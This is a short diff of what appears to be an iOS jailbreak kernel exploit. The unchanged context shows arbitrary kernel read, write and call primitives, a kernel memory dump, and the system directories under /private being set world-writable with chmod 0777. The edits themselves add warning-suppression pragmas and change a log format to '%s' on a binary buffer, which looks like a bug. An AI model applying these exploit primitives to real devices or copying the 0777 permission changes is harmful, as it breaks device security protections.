@@ -45,6 +45,10 @@ uint32_t FuncAnywhere32(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2)
     return IOConnectTrap4(funcconn, 0, x1, x2, x0, addr);
 }
 
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
+
+
 void copyin(void* to, uint64_t from, size_t size) {
     mach_vm_size_t outsize = size;
     size_t szt = size;
@@ -182,7 +186,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         copyin(kdump+k*0x4000, min+k*0x4000, 0x4000);
     }
     
-    NSLog(@"%llx", kdump);
+    NSLog(@"%s", kdump);
     uint64_t kerndumpsize = 0;
     uint64_t gadget_base = 0;
     uint64_t gadget_size = 0;
@@ -837,7 +841,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         
         WriteAnywhere32(v_mount + 0x71, v_flag);
     }
-    
+
     {
         char path[256];
         uint32_t size = sizeof(path);
@@ -923,6 +927,7 @@ remappage[remapcnt++] = (x & (~PMK));\
             
         }
     }
+  
     chmod("/private", 0777);
     chmod("/private/var", 0777);
     chmod("/private/var/mobile", 0777);
@@ -935,3 +940,4 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     NSLog(@"done");
 }
+  #pragma GCC diagnostic pop
